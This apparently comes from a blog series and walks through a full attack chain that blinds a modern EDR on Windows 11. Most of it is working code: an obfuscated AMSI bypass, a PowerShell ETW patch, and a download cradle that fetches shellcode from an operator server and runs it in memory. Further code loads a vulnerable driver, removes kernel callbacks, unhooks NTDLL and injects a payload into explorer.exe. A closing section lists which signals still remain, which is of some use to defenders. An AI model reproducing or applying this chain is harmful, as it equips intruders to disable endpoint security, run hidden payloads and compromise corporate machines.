---
layout: page
title: "Full Chain: Bypassing a Modern EDR End to End"
---

# Full Chain: Bypassing a Modern EDR End to End

Every article in this series addressed one layer of the detection stack in isolation. In practice, no single technique is sufficient. A modern EDR is layered: AMSI catches scripts, ETW feeds the behavioral engine, user-mode hooks intercept API calls, kernel callbacks fire regardless of hook state, and handle stripping limits what even a clean process can do. Bypassing one layer while leaving the others intact accomplishes nothing.

This article assembles the full chain. Each step is chosen to address a specific detection layer before the next step activates it. The sequence matters as much as the individual techniques.

## Target Environment

A corporate endpoint running Windows 11 with:
- CrowdStrike Falcon (or equivalent mature EDR) with kernel sensor
- AMSI enabled, Windows Defender as AMSI provider
- PowerShell ScriptBlock logging and transcription enabled
- Sysmon deployed, collecting process creation, network, and image load events
- HVCI disabled (common in environments with older hardware or legacy driver dependencies)
- The operator has a shell as a standard user; privilege escalation to local admin was achieved by a separate vulnerability

HVCI disabled is the constraint that makes BYOVD viable. With HVCI enabled, the chain changes at the kernel layer and the techniques are more constrained.

## Overview

```
Stage 1 (PowerShell, user context)
  └── AMSI bypass + ETW bypass
  └── Download and execute Stage 2 shellcode in memory

Stage 2 (native loader, user context → admin)
  └── Load vulnerable driver (admin required)
  └── Remove kernel callbacks via IOCTL primitive
  └── Map clean NTDLL, patch EtwEventWrite
  └── Use indirect syscalls for all subsequent operations
  └── Reflectively inject final payload into explorer.exe
  └── Unload driver, clean registry

Stage 3 (payload, inside explorer.exe)
  └── C2 communication
  └── Further operations
```

## Step 1: AMSI and ETW Bypass in PowerShell

The entry point is a PowerShell download cradle. The first thing the operator does is disable AMSI and ETW before any payload content is submitted or executed. The bypass code must itself avoid detection, so strings are assembled at runtime.

```powershell
# Reconstruct class and field names without literals
$a = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA=='))
# decodes to: System.Management.Automation.AmsiUtils

$b = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))
# decodes to: amsiInitFailed

$c = [Ref].Assembly.GetType($a)
$d = $c.GetField($b, 'NonPublic,Static')
$d.SetValue($null, $true)

# ETW: patch EtwEventWrite in this process
$sig = @"
[DllImport("kernel32.dll")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
    uint flNewProtect, out uint lpflOldProtect);
"@
$win32 = Add-Type -MemberDefinition $sig -Name "W" -Namespace "P" -PassThru

$ntdll    = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE(
                [System.AppDomain]::CurrentDomain.GetAssemblies() |
                Where-Object { $_.Location -match 'ntdll' } |
                Select-Object -First 1
            )
$etw_addr = [System.Runtime.InteropServices.Marshal]::GetProcAddress($ntdll, 'EtwEventWrite')

$patch = [byte[]](0x33, 0xC0, 0xC3)  # xor eax, eax; ret
$old   = [uint32]0
$win32::VirtualProtect($etw_addr, [UIntPtr]3, 0x40, [ref]$old) | Out-Null
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $etw_addr, 3)
$win32::VirtualProtect($etw_addr, [UIntPtr]3, $old, [ref]$old) | Out-Null
```

At this point: AMSI is blind, ETW from this process is silent. PowerShell ScriptBlock logging emits nothing because AMSI bypass set `amsiInitFailed` before the logging channel was triggered, and the ETW patch stops the `Microsoft-Windows-PowerShell` provider from emitting script block events.

Download and execute Stage 2 as a byte array. No file touches disk:

```powershell
$url  = 'https://operator-controlled-server/stage2.bin'
$data = (New-Object Net.WebClient).DownloadData($url)

# Allocate executable memory and run
$alloc = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($data.Length)
[System.Runtime.InteropServices.Marshal]::Copy($data, 0, $alloc, $data.Length)

$win32_exec = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern bool VirtualProtect(IntPtr lp, UIntPtr dw, uint fl, out uint old);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr a, UIntPtr b, IntPtr c, IntPtr d, uint e, out uint f);
[DllImport("kernel32.dll")]
public static extern uint WaitForSingleObject(IntPtr h, uint ms);
"@ -Name "E" -Namespace "X" -PassThru

$old = [uint32]0
$win32_exec::VirtualProtect($alloc, [UIntPtr]$data.Length, 0x20, [ref]$old) | Out-Null
$tid = [uint32]0
$t   = $win32_exec::CreateThread([IntPtr]::Zero, [UIntPtr]::Zero,
                                   $alloc, [IntPtr]::Zero, 0, [ref]$tid)
$win32_exec::WaitForSingleObject($t, 0xFFFFFFFF) | Out-Null
```

Stage 2 executes in the PowerShell process's memory. No file was written.

## Step 2: Load the Vulnerable Driver

Stage 2 is a compiled native loader running in the PowerShell process with admin rights. Its first action is kernel access.

The vulnerable driver (`RTCore64.sys` or a more recent alternative not yet on the blocklist) is embedded in the Stage 2 binary as a byte array. It is written to disk only long enough to be loaded:

```c
// Write driver to a temp path with a benign-looking name
char temp_path[MAX_PATH];
GetTempPathA(MAX_PATH, temp_path);
strcat_s(temp_path, MAX_PATH, "\\WinDiag64.sys");

FILE *f = fopen(temp_path, "wb");
fwrite(driver_bytes, 1, driver_size, f);
fclose(f);

// Load via NtLoadDriver
NTSTATUS status = load_driver(temp_path_wide, L"WinDiag64");

// Open handle to the driver's device
HANDLE device = CreateFileA("\\\\.\\RTCore64",
    GENERIC_READ | GENERIC_WRITE, 0,
    NULL, OPEN_EXISTING, 0, NULL);
```

The driver file is on disk only momentarily. Minifilter callbacks fire on write and will scan it. The driver must not match any known-bad signature. Using a driver whose hash is not yet on the Microsoft blocklist is the operational constraint here.

## Step 3: Remove Kernel Callbacks

With the IOCTL primitive available, find the kernel base and zero the callback arrays:

```c
ULONG64 kernel_base = get_kernel_base();  // NtQuerySystemInformation

// Pattern-scan NTOSKRNL on disk to find PspCreateProcessNotifyRoutine offset
ULONG64 process_cb_array = find_callback_array(
    kernel_base,
    ntoskrnl_disk_bytes,
    ntoskrnl_disk_size,
    process_notify_pattern,
    sizeof(process_notify_pattern),
    3   // displacement offset within the instruction
);

ULONG64 image_cb_array = find_callback_array(
    kernel_base, ntoskrnl_disk_bytes, ntoskrnl_disk_size,
    image_notify_pattern, sizeof(image_notify_pattern), 3
);

ULONG64 thread_cb_array = find_callback_array(
    kernel_base, ntoskrnl_disk_bytes, ntoskrnl_disk_size,
    thread_notify_pattern, sizeof(thread_notify_pattern), 3
);

// Zero all callback entries in all three arrays
remove_callbacks(device, process_cb_array);
remove_callbacks(device, image_cb_array);
remove_callbacks(device, thread_cb_array);

// Unlink ObRegisterCallbacks entries for process objects
remove_object_callbacks(device, kernel_base);
```

After this, the EDR's kernel sensor receives no process creation, image load, or thread creation events. Its `ObRegisterCallbacks` handler for handle stripping is unlinked. Handle requests now receive the full requested access mask.

## Step 4: Unload the Driver and Clean Up

The driver served its purpose. Remove it:

```c
CloseHandle(device);
unload_driver(L"WinDiag64");

// Delete service registry key
RegDeleteKeyA(HKEY_LOCAL_MACHINE,
    "SYSTEM\\CurrentControlSet\\Services\\WinDiag64");

// Delete the driver file
DeleteFileA(temp_path);
```

The driver load event (Windows Event ID 7045) is already in the event log. This is unavoidable. The event shows a driver named "WinDiag64" loaded and unloaded. It does not show what the driver was used for.

## Step 5: Unhook NTDLL and Patch ETW at the Native Level

The PowerShell process already has ETW patched. Stage 2, running in the same process, now performs a clean NTDLL mapping to remove any remaining user-mode hooks. This is redundant in the current process (since the callbacks are gone and hooks are less critical) but matters for the injection target process:

```c
// Map fresh NTDLL -- will be used to restore hooks in the injection target
HANDLE clean_ntdll_mapping = map_ntdll_from_disk();
LPVOID clean_ntdll         = MapViewOfFile(clean_ntdll_mapping,
                                           FILE_MAP_READ, 0, 0, 0);

// In the current process: restore .text section from clean copy
unhook_ntdll_from_clean_copy(clean_ntdll);

// Also patch EtwEventWrite at the native level (belt and suspenders)
patch_etw_write();
```

## Step 6: Inject into explorer.exe

With callbacks removed and hooks cleared, injection proceeds using indirect syscalls to avoid any remaining user-mode inspection. The target is `explorer.exe`.

```c
DWORD explorer_pid = find_process_pid("explorer.exe");

// OpenProcess now succeeds with full access -- ObRegisterCallbacks unlinked
HANDLE target = NtOpenProcess_Indirect(
    PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
    explorer_pid
);

// Allocate RW in target via indirect syscall
PVOID  remote_buf = NULL;
SIZE_T buf_size   = payload_size;

NtAllocateVirtualMemory_Indirect(
    target, &remote_buf, 0, &buf_size,
    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
);

// Write payload bytes
SIZE_T written;
NtWriteVirtualMemory_Indirect(
    target, remote_buf, payload_bytes, payload_size, &written
);

// Flip to RX
ULONG old_prot;
NtProtectVirtualMemory_Indirect(
    target, &remote_buf, &buf_size, PAGE_EXECUTE_READ, &old_prot
);

// Before creating a thread: patch EtwEventWrite in explorer.exe too
// Write the same 3-byte patch into explorer's ntdll via the handle we have
patch_etw_in_remote_process(target, clean_ntdll);

// Unhook NTDLL in explorer.exe using the clean mapping
unhook_remote_ntdll(target, clean_ntdll);

// Create thread via indirect syscall -- no CreateRemoteThread
HANDLE remote_thread;
NtCreateThreadEx_Indirect(
    &remote_thread, GENERIC_EXECUTE, NULL,
    target, (LPTHREAD_START_ROUTINE)remote_buf,
    NULL, FALSE, 0, 0, 0, NULL
);
```

Every syscall above uses the indirect variant: the `syscall` instruction executes inside NTDLL at the correct offset, the SSN is resolved from the unhooked stub, and the call chain from user space to kernel is clean. The return address logged by the kernel for the syscall transition is inside NTDLL, not inside an anonymous region.

## Step 7: The Payload in explorer.exe

The payload is a reflective DLL that:
1. Loads itself using the reflective technique
2. Registers in the PEB module list as a benign-sounding name
3. Establishes C2 communication over HTTPS using `WinHTTP` (a legitimate, commonly used API in `explorer.exe` context)
4. Patches ETW in its own context for any subsequent PowerShell or script-based operations

The EDR's behavioral engine in user space has no hooks to catch API calls from the payload. Its kernel sensor receives no image load event for the injected DLL. Its handle monitoring is not active because the `ObRegisterCallbacks` entry was removed. Its ETW feed is silent because `EtwEventWrite` is patched in the `explorer.exe` process.

What remains active: the kernel's own TI provider events for the allocation and protect sequence that occurred during injection. These events fire at the kernel level and are not affected by any user-mode patch. A well-tuned EDR consuming TI provider data will see a memory allocation sequence in `explorer.exe` that matches injection patterns.

## Where This Chain Fails

Against a fully hardened environment:

**HVCI enabled**: The vulnerable driver cannot load because its hash is on the blocklist or because HVCI enforces signing at the hypervisor level. Without the kernel primitive, callbacks stay in place, handle stripping remains active, and injection is significantly more difficult.

**EDR with kernel-level ETW consumer**: The TI provider events for the `NtAllocateVirtualMemory` + `NtWriteVirtualMemory` + `NtProtectVirtualMemory` + `NtCreateThreadEx` sequence into a foreign process are logged at the kernel level. A behavioral rule matching this sequence flags the activity regardless of hook state.

**Network inspection**: C2 traffic over HTTPS is encrypted but the connection metadata (destination IP, timing, beacon pattern) is visible to network monitoring. DNS queries to C2 infrastructure are logged. Certificate transparency logs may expose C2 infrastructure.

**Memory scanning**: Periodic memory scans by the EDR that walk `explorer.exe`'s committed regions can find the injected payload. PE headers in a region with no backing module, or a region whose permissions changed from RW to RX without a corresponding image load event, are detectable.

## What the Chain Actually Accomplishes

This chain reliably neutralizes: signature detection, AMSI content inspection, PowerShell telemetry, user-mode hook interception, ETW user-mode provider feeds, kernel process/thread/image callbacks, and handle stripping.

It does not neutralize: kernel TI provider events, network telemetry, periodic memory scanning, and forensic analysis of the Event ID 7045 driver load artifact.

Whether those remaining signals generate an alert depends on the EDR's ruleset, its confidence threshold for automated response, and whether a human analyst is reviewing the telemetry. In most environments, the chain completes before automated response fires. In a SOC with 24/7 human coverage and low alert thresholds, the driver load event alone may trigger an investigation within minutes.

The gap between a technique working and it working without generating any alert that a human sees is much larger than the gap between a technique working and it being technically detectable. Both matter.
